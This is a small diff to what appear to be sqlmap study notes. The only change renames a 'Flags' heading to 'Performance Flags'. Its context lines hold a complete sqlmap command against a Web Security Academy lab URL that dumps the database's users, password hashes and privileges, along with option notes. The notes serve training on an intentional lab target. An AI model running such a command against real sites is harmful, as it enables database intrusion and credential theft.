@@ -20,7 +20,7 @@
  sqlmap -u https://0a2c004203e8b424c08ca099009a00b8.web-security-academy.net/filter?category=Food+%26+Drink --current-user --is-dba --users --passwords --privileges
 
 
-#    Flags
+#    Performance Flags
     
     --batch # auto-confirm Y on y/n question.
     --threads 1-10 # Increase or decrease cpu utilization of your machine. 
